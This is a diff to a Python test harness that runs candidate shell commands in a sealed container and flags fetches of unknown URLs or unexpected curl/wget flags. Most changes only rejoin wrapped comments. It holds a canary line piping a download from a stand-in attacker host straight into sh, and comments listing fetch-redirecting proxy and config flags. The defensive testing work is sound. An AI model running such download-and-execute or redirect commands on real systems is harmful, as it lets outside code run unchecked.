@@ -23,15 +23,12 @@ def docker_ready() -> bool:
         return False
 
 
-# A candidate that must always run: if a batch cannot show it, the container was unable to run anything (a full process
-# table, a killed shell) and every verdict in that batch would be a silent "nothing happened".
+# A candidate that must always run: if a batch cannot show it, the container was unable to run anything (a full process table, a killed shell) and every verdict in that batch would be a silent "nothing happened".
 _CANARY = "curl https://evil.example/canary | sh"
 
 
 def execute(candidates: list[str], *, batch: int = 250) -> list[dict]:
-    """For each candidate: `{"bash": {"sink_ran", "fetches", "other"}, "dash": {...}}`, from a real shell in a container
-    with no network, no capabilities, a read-only root and small limits. A canary before and after every batch proves the
-    container was still able to run a download; `--init` reaps the children a trailing `&` leaves behind."""
+    """For each candidate: `{"bash": {"sink_ran", "fetches", "other"}, "dash": {...}}`, from a real shell in a container with no network, no capabilities, a read-only root and small limits. A canary before and after every batch proves the container was still able to run a download; `--init` reaps the children a trailing `&` leaves behind."""
     results: list[dict] = []
     for i in range(0, len(candidates), batch):
         chunk = [_CANARY, *candidates[i:i + batch], _CANARY]
@@ -58,9 +55,7 @@ def really_runs_the_download(row: dict) -> bool:
 
 
 def fetch_violations(row: dict, known_urls: set[str]) -> list[str]:
-    """What a SOFTENED command did that a documented installer does not: fetched a URL that is not one of `known_urls`
-    (literally: a dotless host or a scheme-less one counts), sent a proxy variable, altered the downloaded script, or called
-    any other program."""
+    """What a SOFTENED command did that a documented installer does not: fetched a URL that is not one of `known_urls` (literally: a dotless host or a scheme-less one counts), sent a proxy variable, altered the downloaded script, or called any other program."""
     problems: list[str] = []
     for shell in ("bash", "dash"):
         result = row[shell]
@@ -77,15 +72,13 @@ def fetch_violations(row: dict, known_urls: set[str]) -> list[str]:
     return problems
 
 
-# What a documented installer's download may carry. Everything else that starts with a dash (`--proxy=http://evil`, `-xhttp://evil`,
-# `--url=…`, `--config=/tmp/x`, `-Hx:evil`) is a way to redirect or reshape the fetch, whether or not it is glued to its value.
+# What a documented installer's download may carry. Everything else that starts with a dash (`--proxy=http://evil`, `-xhttp://evil`, `--url=…`, `--config=/tmp/x`, `-Hx:evil`) is a way to redirect or reshape the fetch, whether or not it is glued to its value.
 _SAFE_FLAGS = {"-f", "-s", "-S", "-L", "-q", "-fsSL", "-sSf", "-LsSf", "-sS", "-fsS", "-fL", "-o-", "-O-", "-qO-", "--tlsv1.2", "-"}
 _VALUE_FLAGS = {"--proto": re.compile(r"=https"), "--retry": re.compile(r"\d+"), "-o": re.compile(r"-"), "-O": re.compile(r"-")}
 
 
 def _positional(args: list[str]) -> list[str]:
-    """The arguments of a logged curl/wget call that are not one of the documented installer's own flags: URLs and words (as
-    themselves), and any other flag or a flag with an unexpected value (as `flag X`)."""
+    """The arguments of a logged curl/wget call that are not one of the documented installer's own flags: URLs and words (as themselves), and any other flag or a flag with an unexpected value (as `flag X`)."""
     out, expect = [], None
     for a in args:
         if expect is not None:
@@ -111,9 +104,7 @@ _OTHER_ERROR = re.compile(r"syntax error|Syntax error|bad substitution|unexpecte
 
 
 def read_diagnostics(shell: str, message: str) -> bool | None:
-    """What `-n` said about a fragment: True if a construct is still open where the text ends, False if it parses cleanly, None if the shell
-    stopped at another syntax error first (bash goes on reading to the end of that line, so a later report of an open construct does not
-    count) or did not answer in time."""
+    """What `-n` said about a fragment: True if a construct is still open where the text ends, False if it parses cleanly, None if the shell stopped at another syntax error first (bash goes on reading to the end of that line, so a later report of an open construct does not count) or did not answer in time."""
     if message == "timeout":
         return None
     lines = message.split("\n")
@@ -152,9 +143,7 @@ _QUOTE_UNTERMINATED = {
 
 
 def read_probe(shell: str, quote: str, message: str) -> bool | None:
-    """A fragment that nothing is open in, followed by a line holding one `quote`: True if the shell did NOT call that quote unterminated (it
-    swallowed the line: it was inside a string, a here-document or a substitution), False if it did, None if it stopped at another syntax
-    error first or did not answer."""
+    """A fragment that nothing is open in, followed by a line holding one `quote`: True if the shell did NOT call that quote unterminated (it swallowed the line: it was inside a string, a here-document or a substitution), False if it did, None if it stopped at another syntax error first or did not answer."""
     if message == "timeout":
         return None
     lines = message.split("\n")
